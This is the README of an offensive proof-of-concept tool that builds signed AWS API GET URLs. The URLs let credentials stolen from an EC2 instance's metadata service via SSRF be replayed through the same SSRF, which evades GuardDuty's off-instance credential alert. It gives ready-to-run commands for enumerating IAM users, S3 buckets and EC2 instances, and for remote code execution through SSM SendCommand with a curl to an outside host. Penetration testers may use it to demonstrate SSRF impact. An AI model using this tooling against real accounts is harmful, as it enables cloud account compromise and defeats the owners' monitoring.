# aws_url_signer

POC tool to create signed AWS API GET requests to bypass Guard Duty alerting of off-instance credential use via SSRF

# What?

AWS has a Guard Duty alert to advise when an AWS instance credential is used outside of the instance itself. This will give you a heads up when the instance credentials are stolen using a vulnerability like a Server Side Request Forgery (SSRF) from the Metadata URL.

This alerting relies on the instance credential being taken off the host and then used to make an AWS API query from a host that is not in the associated AWS account. This is a common circumstance when instance credentials are comprimised via SSRF - attacker gets the instance creds from the metadata service on a vulnerable EC2 host, configures those credentials locally on their own local host, and then calls the AWS API to try and further compromise the AWS account.

Even though its not obviously exposed in the various client libraries in any way other than for S3 however, it is possible to make general requests of the AWS API using HTTP GET requests. This allows you to create signed URLs to query the AWS API, send them via the same mechanism by which you compromised the credentials in the first place (e.g. SSRF), and bypass the Guard Duty alerting. This is because AWS API calls made in this way are not being made outside of the AWS account owning the credential - from the perspective of the API server they are coming from the same EC2 instance that owns that credential.



# Usage

This tool is a proof of concept that implements the AWS v4 API signing algorithm for GET URLS. It has very minimal requirements, using `botocore` just to get the list of available services and API versions. 

It has a simple command line interface to run standalone and can also be imported as a module into other Python 3 code to allow it to be more easily used with other exploit code (e.g. SSRF, XXE, etc).

In the very simplest form, you can set your stolen credentials into the standard environment variables (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY` and `AWS_SESSION_TOKEN`) and call the tool like the following to run the `GetCallerIdentity` action for the `sts` service.

```
./aws_url_signer.py -environment -service sts -action GetCallerIdentity
```

This will spit out a signed URL, with a 180 second expiry time, that can be sent in your exploit to make the associated API call. The response will tell you about the  "caller Identity" of the credential you have.

You can do more complex stuff by sending parameters to the call as a JSON encoded string.

The following example uses SSM to generate a URL to remotely execute code against a managed Linux instance `i-xxxxxxxxxxxxxxxxx` in the account.

```
./aws_url_signer.py -environment -service ssm -action SendCommand -region ap-southeast-2 -parameters '{"InstanceIds": ["i-xxxxxxxxxxxxxxxxx"], "DocumentName": "AWS-RunShellScript", "Parameters": {"commands": ["curl http://test.site/123"]}}'
```


You can also stick the .py file in your Python path and use it in your code like so.

```
from aws_url_signer import AWSApiUrlGenerator

api = AWSApiUrlGenerator(access_key, secret_key, session_token)
request_url = api.create_service_url('s3', 'ListBuckets', region='ap-southeast-2')

```

To a large extent you do need to know the AWS API to be able to use this in a useful way, although I have provided some of the examples I have personally tested below.  You can largely start from [here](https://docs.aws.amazon.com/index.html), find the service you want, and take what would normally be sent in a POST request for a particular API call and supply it JSON encoded to the `parameters` option, and it _SHOULD_ work.


# Warning 

This is a signed https URL that can perform AWS API calls as the compromised user. Standard warnings for leaving the URL where others can see it or having it leaked in logs or other intermediate devices applies. The URLs do timeout after a default period of 180 seconds, so the URLs do have a limited lifetime.


# Alpha code

This should be considered Alpha quality code.

At the time of writing there are 313 services currently supported in the AWS API - I have only tested a small fraction of them that I personally needed to prove impact of SSRF related vulnerabilities.

While the signing process is meant to be standard across the services, there are differences in where regional endpoints sit, and the specific nature of the signed payload and signing process for some services. This could mean that some services I have not specifically tested may not work, but I think many probably will.

The process by which more complex parameter structures are converted into GET compatible versions is also weird. Its possible my code to convert parameters from a standard JSON compatible format is wrong or incomplete, and this will only become clear once someone tries to send parameters more complex than the SSM code execution example above.

Feel free to raise issues or PRs if you find any problems.


# Examples

Here are some examples of running the command line version of the tool. There are some additional commented examples for using the module in code in the source.
```
./aws_url_signer.py -environment -service iam -action ListUsers
./aws_url_signer.py -environment -service sts -action GetCallerIdentity
./aws_url_signer.py -region ap-southeast-2 -environment -service ssm -action DescribeInstanceInformation 
./aws_url_signer.py -region ap-southeast-2 -environment -service ec2 -action DescribeInstances -parameters '{"MaxResults": "5"}'
./aws_url_signer.py -region ap-southeast-2 -environment -service s3 -action ListBuckets
```